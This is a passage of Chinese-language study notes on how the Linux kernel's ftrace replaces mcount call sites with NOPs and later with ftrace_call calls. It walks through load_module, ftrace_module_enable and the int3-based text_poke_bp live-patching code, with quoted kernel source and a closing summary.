		       0000000000000018  0000000000000000   A       0     0     1
		  [ 7] .rela__mcount_loc RELA             0000000000000000  000200b0
		       0000000000000048  0000000000000018   I      33     6     8
		.....



		struct module {
		.....
		#ifdef CONFIG_FTRACE_MCOUNT_RECORD
			unsigned int num_ftrace_callsites;/*__mcount数目 */
			unsigned long *ftrace_callsites;/* 地址列表 */
		#endif
		......
		};

		#define FTRACE_CALLSITE_SECTION	"__mcount_loc"

		load_module(struct load_info *info,const char __user *uarge,int flags)

		#ifdef CONFIG_FTRACE_MCOUNT_RECORD
			/* sechdrs[0].sh_size is always zero *//* __mcount_loc?*/
			mod->ftrace_callsites = section_objs(info, FTRACE_CALLSITE_SECTION,
							     sizeof(*mod->ftrace_callsites),
							     &mod->num_ftrace_callsites);
		#endif
			ftrace_module_init(mod);
				ftrace_process_locs(mod,mod->ftrace_callsiztes,mod->ftrace_callsites + mod->num_ftrace_callsites);
					ftrace_pages->next = start_pg; /* 申请一个ftrace_pages，并插入以ftrae_pages_start为第一个结构的链表中*/
					while: rec->ip = addr;/* 地址列表中所有地址内容 */
				
			prepare_coming_module(mod);
				ftrace_module_enable(mod){
					 ftrace_start_up: ftrace_arch_code_modify_prepare();
					 do_for_each_ftrace_rec(pg,rec);/* 遍历获取每个ftrace_pages 结构，并遍历其中的records*/
		分析：

						if:within_module_core(rec->ip,mod); /* 找到属于当前模块的ip */
							within_module_init(rec->ip,mod); /* 找到属于当前模块的ip */
						
						if(ftrace_start_up)
							cnt += referenced_filters(rec);
							
						__ftrace_replace_code(rec,1);
							ftrace_addr = ftrace_get_addr_new(rec):
									return FTRACE_ADDR;
							ftrace_old_addr = ftrace_get_addr_curr(rec);
									return FTRACE_ADDR;
							ftrace_update_record(rec,enable);
								ftrace_check_record(rec,enable,true);
									return FTRACE_UPDATE_MAKE_NOP;
							ftrace_make_nop(NULL,rec,ftrace_old_addr);/* 将ip指向的内容设置为nop */
					} while_for_each_ftrace_rec();
					
					ftrace_arch_code_modify_post_process();
							text_poke_finish();
								text_poke_flush(NULL);	
					process_cached_mods(mod->name);/*下一步补充 */
		
	到这儿同样把mcount地址中的值替换为nop;

3. nop ==> ftrace_call

	.. code-block:: c
		:caption: ftrace_call替换
		:linenos:

		trace_init()
			trace_event_init()
				event_trace_enable
					register_event_cmds
						trace_trace_probe_callback
							register_ftrace_function_probe()
									ftrace_hash_move_and_update_ops()
										ftrace_ops_update_code()
											ftrace_run_modify_code(struct ftrace_ops *ops,int command,struct ftrace_ops_hash *old_hash)
												ftrace_startup_enable(int command);
												ftrace_shutdown(struct ftrace_ops *ops,int command)
												ftrace_shutdown_sysctl(void): FTRACE_DISABLE_CALLS;

													ftrace_run_update_code(command);
														arch_ftrace_update_code(command)
															ftrace_modify_all_code(&command);
																FTRACE_UPDATE_TRACE_FUNC:
																	ftrace_update_ftrace_func(ftrace_ops_list_func);
																		int ftrace_update_ftrace_func(ftrace_func_t func)
																		{
																			unsigned long ip;
																			const char *new;

																			ip = (unsigned long)(&ftrace_call);
																			new = ftrace_call_replace(ip, (unsigned long)func);
																			text_poke_bp((void *)ip, new, MCOUNT_INSN_SIZE, NULL);

																			ip = (unsigned long)(&ftrace_regs_call);
																			new = ftrace_call_replace(ip, (unsigned long)func);
																			text_poke_bp((void *)ip, new, MCOUNT_INSN_SIZE, NULL);

																			return 0;
																		}

																FTRACE_UPDATE_CALLS:
																	ftrace_replace_code(mod_flags | FTRACE_MODIFY_ENABLE_FL);
																FTRACE_DISABLE_CALLS:
																	ftrace_replace_code(mod_flags);
																FTRACE_START_FUNC_RET:
																	ftrace_enable_ftrace_graph_caller();
																FTRACE_STOP_FUNC_RET:
																	ftrace_disable_ftrace_graph_caller();
																
																

	.. code-block:: c
		:caption: 具体指令替换
		:linenos:															
													
		int ftrace_update_ftrace_func(ftrace_func_t func)
		{
			unsigned long ip;
			const char *new;

			ip = (unsigned long)(&ftrace_call);
			new = ftrace_call_replace(ip, (unsigned long)func);/* 解释：call func */
			text_poke_bp((void *)ip, new, MCOUNT_INSN_SIZE, NULL);/* 更新指令*/

			ip = (unsigned long)(&ftrace_regs_call);
			new = ftrace_call_replace(ip, (unsigned long)func);
			text_poke_bp((void *)ip, new, MCOUNT_INSN_SIZE, NULL);

			return 0;
		}


		ip -> 
		SYM_FUNC_START(ftrace_caller)
			/* save_mcount_regs fills in first two parameters */
			save_mcount_regs

			/* Stack - skipping return address of ftrace_caller */
			leaq MCOUNT_REG_SIZE+8(%rsp), %rcx
			movq %rcx, RSP(%rsp)

		SYM_INNER_LABEL(ftrace_caller_op_ptr, SYM_L_GLOBAL)
			/* Load the ftrace_ops into the 3rd parameter */
			movq function_trace_op(%rip), %rdx

			/* regs go into 4th parameter */
			leaq (%rsp), %rcx

			/* Only ops with REGS flag set should have CS register set */
			movq $0, CS(%rsp)

		SYM_INNER_LABEL(ftrace_call, SYM_L_GLOBAL)
			call ftrace_stub

			/* Handlers can change the RIP */
			movq RIP(%rsp), %rax
			movq %rax, MCOUNT_REG_SIZE(%rsp)

			restore_mcount_regs

			/*
			 * The code up to this label is copied into trampolines so
			 * think twice before adding any new code or changing the
			 * layout here.
			 */
		SYM_INNER_LABEL(ftrace_caller_end, SYM_L_GLOBAL)

			jmp ftrace_epilogue
		SYM_FUNC_END(ftrace_caller);




		static const char *ftrace_call_replace(unsigned long ip, unsigned long addr)
		{
			return text_gen_insn(CALL_INSN_OPCODE, (void *)ip, (void *)addr);/* 相对地址：CALL_INSN_OPCODE*/
		}

		/**
		 * text_poke_bp() -- update instructions on live kernel on SMP
		 * @addr:	address to patch
		 * @opcode:	opcode of new instruction
		 * @len:	length to copy
		 * @emulate:	instruction to be emulated
		 *
		 * Update a single instruction with the vector in the stack, avoiding
		 * dynamically allocated memory. This function should be used when it is
		 * not possible to allocate memory.
		 */
		void __ref text_poke_bp(void *addr, const void *opcode, size_t len, const void *emulate)
		{
			struct text_poke_loc tp;

			if (unlikely(system_state == SYSTEM_BOOTING)) {
				text_poke_early(addr, opcode, len);
				return;
			}

			text_poke_loc_init(&tp, addr, opcode, len, emulate);/* */
			text_poke_bp_batch(&tp, 1);
		}


		/**
		 * text_poke_bp_batch() -- update instructions on live kernel on SMP
		 * @tp:			vector of instructions to patch
		 * @nr_entries:		number of entries in the vector
		 *
		 * Modify multi-byte instruction by using int3 breakpoint on SMP.
		 * We completely avoid stop_machine() here, and achieve the
		 * synchronization using int3 breakpoint.
		 *
		 * The way it is done:
		 *	- For each entry in the vector:
		 *		- add a int3 trap to the address that will be patched
		 *	- sync cores
		 *	- For each entry in the vector:
		 *		- update all but the first byte of the patched range
		 *	- sync cores
		 *	- For each entry in the vector:
		 *		- replace the first byte (int3) by the first byte of
		 *		  replacing opcode
		 *	- sync cores
		 */
		static void text_poke_bp_batch(struct text_poke_loc *tp, unsigned int nr_entries)
		{
			struct bp_patching_desc desc = {
				.vec = tp,
				.nr_entries = nr_entries,
				.refs = ATOMIC_INIT(1),
			};
			unsigned char int3 = INT3_INSN_OPCODE;
			unsigned int i;
			int do_sync;

			lockdep_assert_held(&text_mutex);

			smp_store_release(&bp_desc, &desc); /* rcu_assign_pointer */

			/*
			 * Corresponding read barrier in int3 notifier for making sure the
			 * nr_entries and handler are correctly ordered wrt. patching.
			 */
			smp_wmb();

			/*
			 * First step: add a int3 trap to the address that will be patched.
			 */
			for (i = 0; i < nr_entries; i++) {
				tp[i].old = *(u8 *)text_poke_addr(&tp[i]);
				text_poke(text_poke_addr(&tp[i]), &int3, INT3_INSN_SIZE);
			}

			text_poke_sync();

			/*
			 * Second step: update all but the first byte of the patched range.
			 */
			for (do_sync = 0, i = 0; i < nr_entries; i++) {
				u8 old[POKE_MAX_OPCODE_SIZE] = { tp[i].old, };
				int len = text_opcode_size(tp[i].opcode);

				if (len - INT3_INSN_SIZE > 0) {
					memcpy(old + INT3_INSN_SIZE,
					       text_poke_addr(&tp[i]) + INT3_INSN_SIZE,
					       len - INT3_INSN_SIZE);
					text_poke(text_poke_addr(&tp[i]) + INT3_INSN_SIZE,
						  (const char *)tp[i].text + INT3_INSN_SIZE,
						  len - INT3_INSN_SIZE);
					do_sync++;
				}

				/*
				 * Emit a perf event to record the text poke, primarily to
				 * support Intel PT decoding which must walk the executable code
				 * to reconstruct the trace. The flow up to here is:
				 *   - write INT3 byte
				 *   - IPI-SYNC
				 *   - write instruction tail
				 * At this point the actual control flow will be through the
				 * INT3 and handler and not hit the old or new instruction.
				 * Intel PT outputs FUP/TIP packets for the INT3, so the flow
				 * can still be decoded. Subsequently:
				 *   - emit RECORD_TEXT_POKE with the new instruction
				 *   - IPI-SYNC
				 *   - write first byte
				 *   - IPI-SYNC
				 * So before the text poke event timestamp, the decoder will see
				 * either the old instruction flow or FUP/TIP of INT3. After the
				 * text poke event timestamp, the decoder will see either the
				 * new instruction flow or FUP/TIP of INT3. Thus decoders can
				 * use the timestamp as the point at which to modify the
				 * executable code.
				 * The old instruction is recorded so that the event can be
				 * processed forwards or backwards.
				 */
				perf_event_text_poke(text_poke_addr(&tp[i]), old, len,
						     tp[i].text, len);
			}

			if (do_sync) {
				/*
				 * According to Intel, this core syncing is very likely
				 * not necessary and we'd be safe even without it. But
				 * better safe than sorry (plus there's not only Intel).
				 */
				text_poke_sync();
			}

			/*
			 * Third step: replace the first byte (int3) by the first byte of
			 * replacing opcode.
			 */
			for (do_sync = 0, i = 0; i < nr_entries; i++) {
				if (tp[i].text[0] == INT3_INSN_OPCODE)
					continue;

				text_poke(text_poke_addr(&tp[i]), tp[i].text, INT3_INSN_SIZE);
				do_sync++;
			}

			if (do_sync)
				text_poke_sync();

			/*
			 * Remove and synchronize_rcu(), except we have a very primitive
			 * refcount based completion.
			 */
			WRITE_ONCE(bp_desc, NULL); /* RCU_INIT_POINTER */
			if (!atomic_dec_and_test(&desc.refs))
				atomic_cond_read_acquire(&desc.refs, !VAL);
		}


		static void text_poke_loc_init(struct text_poke_loc *tp, void *addr,
					       const void *opcode, size_t len, const void *emulate)
		{
			struct insn insn;
			int ret;

			memcpy((void *)tp->text, opcode, len);
			if (!emulate)
				emulate = opcode;

			ret = insn_decode_kernel(&insn, emulate);

			BUG_ON(ret < 0);
			BUG_ON(len != insn.length);

			tp->rel_addr = addr - (void *)_stext;
			tp->opcode = insn.opcode.bytes[0];

			switch (tp->opcode) {
			case INT3_INSN_OPCODE:
			case RET_INSN_OPCODE:
				break;

			case CALL_INSN_OPCODE:
			case JMP32_INSN_OPCODE:
			case JMP8_INSN_OPCODE:
				tp->rel32 = insn.immediate.value;
				break;

			default: /* assume NOP */
				switch (len) {
				case 2: /* NOP2 -- emulate as JMP8+0 */
					BUG_ON(memcmp(emulate, x86_nops[len], len));
					tp->opcode = JMP8_INSN_OPCODE;
					tp->rel32 = 0;
					break;

				case 5: /* NOP5 -- emulate as JMP32+0 */
					BUG_ON(memcmp(emulate, x86_nops[len], len));
					tp->opcode = JMP32_INSN_OPCODE;
					tp->rel32 = 0;
					break;

				default: /* unknown instruction */
					BUG();
				}
				break;
			}
		}


3.总结
	a.ftrace 原理总结。
		1.CFLAGS +=-pg ==> mcount
		2.ftrace_init():kernel:__mcount_loc + 模块加载：load_module:__mcount_loc  处理 __mcount_loc节信息，并替换地址中指令为nop;
		3.trace_init()及具体使用时将IP地址中的指令进行进一步替换。
	b.ftrace的跟踪方法是一种总体跟踪法，换句话说，你统计了一个事件到下一个事件所有的时间长度，然后把它们放到时间轴上，你可以知道整个系统运行在时间轴上的分布。这种方法很准确，但跟踪成本很高。下一步分析实现细节。
	b.下一步需要完善：
		- 细化当前引用代码注释；
		- 增加内核模块部分第二步的替换部分；
		- 对指令替换部分进行更深入总结；


















	
	
	
		
			
		






